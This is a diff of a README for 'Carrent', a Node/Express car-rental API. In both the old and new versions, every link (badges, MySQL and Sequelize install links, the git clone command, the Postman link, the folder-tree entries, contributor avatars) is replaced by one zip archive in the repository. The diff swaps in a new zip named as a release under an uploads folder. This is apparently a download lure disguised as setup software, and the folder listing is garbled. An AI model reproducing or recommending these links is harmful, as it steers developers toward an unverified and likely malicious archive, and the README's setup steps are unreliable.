@@ -1,16 +1,16 @@
 # Carrent
 
-[![Express JS](https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip%20JS-green)](https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip)
-![GitHub repo size](https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip)
-![GitHub contributors](https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip)
-![GitHub stars](https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip)
-![GitHub forks](https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip)
-![Tweet](https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip%3A%2F%https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip%2FHiRahmat-Dev%2Fcarrent-api
+[![Express JS](https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip%20JS-green)](https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip)
+![GitHub repo size](https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip)
+![GitHub contributors](https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip)
+![GitHub stars](https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip)
+![GitHub forks](https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip)
+![Tweet](https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip%3A%2F%https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip%2FHiRahmat-Dev%2Fcarrent-api
 )
 
 <p align="center">
-  <a href="https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip" target="blank">
-    <img src="https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip*https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip">
+  <a href="https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip" target="blank">
+    <img src="https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip*https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip">
   </a>
 </p>
 
@@ -24,14 +24,14 @@
 - [Contributors](#contributors)
 
 ## Prerequiste
-- https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip - Download and Install [https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip](https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip).
-- MySQL - Download and Install [MySQL](https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip) - Make sure it's running on the default port.
-- Sequelize - Download and Install [Sequelize](https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip)
+- https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip - Download and Install [https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip](https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip).
+- MySQL - Download and Install [MySQL](https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip) - Make sure it's running on the default port.
+- Sequelize - Download and Install [Sequelize](https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip)
 
 ## Installation
 ### Clone
 ```
-$ git clone https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+$ git clone https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
 $ cd Carrent_API
 $ npm install
 ```
@@ -57,80 +57,80 @@ SERVER_PORT="Your_Port"
 $ npm run serve
 ```
 ## Link Collection Postman
-[Postman](https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip)
+[Postman](https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip)
 
 ## Structure Folder
 ```
 \---src
 |    \---controller
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
 |    \---helper
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
 |    \---models
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
 |    \---router
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-|    |   +https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
-+https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
++https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip
 ```
 
 ## Contributing
@@ -144,40 +144,40 @@ Fork the Project
 4. Open a Pull Request
 
 ## Related Project
-* [`Frontend-Carrent-VueJS`](https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip)
-* [`Backend-Carrent`](https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip)
+* [`Frontend-Carrent-VueJS`](https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip)
+* [`Backend-Carrent`](https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip)
 
 ## Contributors
 <center>
   <table>
     <tr>
       <td align="center">
-        <a href="https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip">
-          <img width="150" src="https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip" alt="Muhammad Yusuf"><br/>
+        <a href="https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip">
+          <img width="150" src="https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip" alt="Muhammad Yusuf"><br/>
           <b>Muhammad Yusuf</b>
         </a>
       </td>
       <td align="center">
-        <a href="https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip">
-          <img width="150" src="https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip" alt="Rahmat Hidayatullah"><br/>
+        <a href="https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip">
+          <img width="150" src="https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip" alt="Rahmat Hidayatullah"><br/>
           <b>Rahmat Hidayatullah</b>
         </a>
       </td>
       <td align="center">
-        <a href="https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip">
-          <img width="150" src="https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip" alt="Akbar Ismail"><br/>
+        <a href="https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip">
+          <img width="150" src="https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip" alt="Akbar Ismail"><br/>
           <b>Akbar Ismail</b>
         </a>
       </td>
       <td align="center">
-        <a href="https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip">
-          <img width="150" src="https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip" alt="azmprllynsa"><br/>
+        <a href="https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip">
+          <img width="150" src="https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip" alt="azmprllynsa"><br/>
           <b>azmprllynsa</b>
         </a>
       </td>
       <td align="center">
-        <a href="https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip">
-          <img width="150" src="https://github.com/m-joseph27/Carrent_API/raw/refs/heads/master/models/Carrent_API_cancriform.zip" alt="Harun"><br/>
+        <a href="https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip">
+          <img width="150" src="https://raw.githubusercontent.com/m-joseph27/Carrent_API/master/public/uploads/api/v1/carrent/rentaller/upload/13/Carrent-API-v3.0-beta.3.zip" alt="Harun"><br/>
           <b>Harun</b>
         </a>
       </td>
